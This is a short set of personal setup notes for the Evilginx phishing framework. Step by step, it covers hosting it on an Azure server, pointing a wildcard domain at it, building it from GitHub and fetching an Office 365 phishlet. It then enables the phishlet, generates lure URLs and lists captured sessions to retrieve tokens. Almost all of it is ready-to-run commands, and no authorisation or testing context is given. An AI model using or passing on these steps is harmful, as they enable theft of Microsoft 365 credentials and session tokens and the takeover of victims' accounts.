# Evilginx 3.0 install notes - Jackson Giordano
Most notes from this are derived from this youtube video: https://www.youtube.com/watch?v=r4Y53s6P51k

And alot of notes from this website, although it could be blocked from certain networks due to its security so I would not access it personally.
    https://evilginx.com/ 


## Setting up server
 1. Through Azure setup an Linux server
     - Ubuntu Version 22.04 / Kali.
     - setup ssh into PuTTY from computer
 2. Setup up Domain name
     - Get Domain setup, cannot be subdomain.
     - A record: @ [IPADDRESS of server]
     - CNAME: * [Previous Domain]
## Open Terminal and log into server
```shell
    ssh root@[ENTERIPADDRESSHERE]

    apt update
 
    apt upgrade

    apt install golang

    git clone https://github.com/kgretzky/evilginx2
    
    cd evilginx2

    go build

    ./evilginx2
    
    exit
```

## Adding Config
```shell
cd ../.evilginx2
nano config.json
```

    
- replace domain with our domain for phishing
- replace ipv4 with the IP from azure server

## Network Settings
1. Open 443 on iptables
2. in the vm nsg open up 443, 80, and 53 inbound for TCP and UDP
---
## Create Phishlet
```shell
cd phishlets
    
wget https://raw.githubusercontent.com/An0nUD4Y/Evilginx2-Phishlets/refs/heads/master/o365.yaml

nano o365.yaml
```
    
- Replace {hostname} sections with your domain

 
## Deploy Phishlet
```shell
    phishlets hostname o365 {DOMAIN} #Enter phishing domain here
    
    phishlets enable o365
```

## Retrieve Lure
```shell
lures create o365

lures get-url {lure index} #Starts at 0
```
## Retrieve Tokens
```shell
sessions

sessions {session number} #desired session based on information above
```
# That should be it!!!
